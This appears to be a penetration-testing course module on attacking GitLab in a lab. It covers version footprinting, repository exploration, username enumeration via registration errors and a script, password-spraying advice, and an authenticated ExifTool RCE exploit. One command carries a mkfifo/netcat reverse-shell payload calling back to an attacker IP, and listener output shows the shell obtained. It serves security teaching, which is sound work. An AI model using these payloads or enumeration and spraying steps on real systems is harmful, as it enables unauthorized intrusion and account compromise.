[GitLab](https://about.gitlab.com/) is a web-based Git-repository hosting tool that provides wiki capabilities, issue tracking, and continuous integration and deployment pipeline functionality. It is open-source and originally written in Ruby, but the current technology stack includes Go, Ruby on Rails, and Vue.js.
# Footprinting
We can quickly determine that GitLab is in use in an environment by just browsing to the GitLab URL, and we will be directed to the login page, which displays the GitLab logo.
![[gitlab_login.webp]]

`The only way to footprint the GitLab version number in use` is by browsing to the `/help` page when logged in.

If the GitLab instance allows us to register an account, we can log in and browse to this page to confirm the version. If we cannot register an account, we may have to try a low-risk exploit such as [this](https://www.exploit-db.com/exploits/49821). We do not recommend launching various exploits at an application, so if we have no way to enumerate the version number (such as a date on the page, the first public commit, or by registering a user), then we should stick to hunting for secrets and not try multiple exploits against it blindly.
# Enumeration
The first thing we should try is browsing to `/explore` and see if there are any public projects that may contain something interesting. Browsing to this page, we see a project called `Inlanefreight dev`.

Public projects can be interesting because we may be able to use them to find out more about the company's infrastructure, find production code that we can find a bug in after a code review, hard-coded credentials, a script or configuration file containing credentials, or other secrets such as an SSH private key or API key.
![[gitlab_explore.webp]]
Browsing to the project, it looks like an example project and may not contain anything useful, though it is always worth digging around.
![[gitlab_example.webp]]
From here, we can explore each of the pages linked in the top left `groups`, `snippets`, and `help`. We can also use the search functionality and see if we can uncover any other projects. Once we are done digging through what is available externally, we should check and see if we can register an account and access additional projects. Suppose the organization did not set up GitLab only to allow company emails to register or require an admin to approve a new account.

In that case, we may be able to access additional data.
![[gitlab_signup.webp]]

We can also use the registration form to enumerate valid users (more on this in the next section). If we can make a list of valid users, we could attempt to guess weak passwords or possibly re-use credentials that we find from a password dump using a tool such as `Dehashed` as seen in the osTicket section. Here we can see the user `root` is taken.

On this particular instance of GitLab (and likely others), we can also enumerate emails. If we try to register with an email that has already been taken, we will get the error `1 error prohibited this user from being saved: Email has already been taken`. As of the time of writing, this username enumeration technique works with the latest version of GitLab.

Even if the `Sign-up enabled` checkbox is cleared within the settings page under `Sign-up restrictions`, we can still browse to the `/users/sign_up` page and enumerate users but will not be able to register a user.

Some mitigations can be put in place for this, such as enforcing 2FA on all user accounts, using `Fail2Ban` to block failed login attempts which are indicative of brute-forcing attacks, and even restricting which IP addresses can access a GitLab instance if it must be accessible outside of the internal corporate network.
![[gitlab_taken2.webp]]

Let's go ahead and register with the credentials `hacker:Welcome` and log in and poke around. As soon as we complete registration, we are logged in and brought to the projects dashboard page. If we go to the `/explore` page now, we notice that there is now an internal project `Inlanefreight website` available to us. Digging around a bit, this just seems to be a static website for the company. Suppose this were some other type of application (such as PHP). In that case, we could possibly download the source and review it for vulnerabilities or hidden functionality or find credentials or other sensitive data.
![[gitlab_internal.webp]]

In a real-world scenario, we may be able to find a considerable amount of sensitive data if we can register and gain access to any of their repositories. As this [blog post](https://tillsongalloway.com/finding-sensitive-information-on-github/index.html) explains, there is a considerable amount of data that we may be able to uncover on GitLab, GitHub, etc.
# Attacking Gitlab

### Username Enumeration
Though not considered a vulnerability by GitLab as seen on their [Hackerone](https://hackerone.com/gitlab?type=team) page ("User and project enumeration/path disclosure unless an additional impact can be demonstrated"), it is still something worth checking as it could result in access if users are selecting weak passwords. We can do this manually, of course, but scripts make our work much faster.

We can write one ourselves in Bash or Python or use [this one](https://www.exploit-db.com/exploits/49821) to enumerate a list of valid users. The Python3 version of this same tool can be found [here](https://github.com/dpgg101/GitLabUserEnum). As with any type of password spraying attack, we should be mindful of account lockout and other kinds of interruptions. GitLab's defaults are set to 10 failed attempts resulting in an automatic unlock after 10 minutes.

Downloading the script and running it against the target GitLab instance, we see that there are two valid usernames, `root` (the built-in admin account) and `bob`.

If we successfully pulled down a large list of users, we could attempt a controlled password spraying attack with weak, common passwords such as `Welcome1` or `Password123`, etc., or try to re-use credentials gathered from other sources such as password dumps from public data breaches.
```bash
./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  			             GitLab User Enumeration Script
   	    			             Version 1.0

Description: It prints out the usernames that exist in your victim's GitLab CE instance

Disclaimer: Do not run this script against GitLab.com! Also keep in mind that this PoC is meant only
for educational purpose and ethical use. Running it against systems that you do not own or have the
right permission is totally on your own risk.

Author: @4DoniiS [<https://github.com/4D0niiS>]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

LOOP
200
[+] The username root exists!
LOOP
302
LOOP
302
LOOP
200
[+] The username bob exists!
LOOP
302
```

### Authenticated Remote Code Execution
GitLab Community Edition version 13.10.2 and lower suffered from an authenticated remote code execution [vulnerability](https://hackerone.com/reports/1154542) due to an issue with ExifTool handling metadata in uploaded image files. This issue was fixed by GitLab rather quickly, but some companies are still likely using a vulnerable version.

We can use this [exploit](https://www.exploit-db.com/exploits/49951) to achieve RCE.

As this is authenticated remote code execution, we first need a valid username and password. In some instances, this would only work if we could obtain valid credentials through OSINT or a credential guessing attack. However, if we encounter a vulnerable version of GitLab that allows for self-registration, we can quickly sign up for an account and pull off the attack.
```bash
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '

[1] Authenticating
Successfully Authenticated
[2] Creating Payload 
[3] Creating Snippet and Uploading
[+] RCE Triggered !!
```

And we get a shell almost instantly.
```bash
nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054

git@app04:~/gitlab-workhorse$ id

id
uid=996(git) gid=997(git) groups=997(git)

git@app04:~/gitlab-workhorse$ ls

ls
VERSION
config.toml
flag_gitlab.txt
sockets
```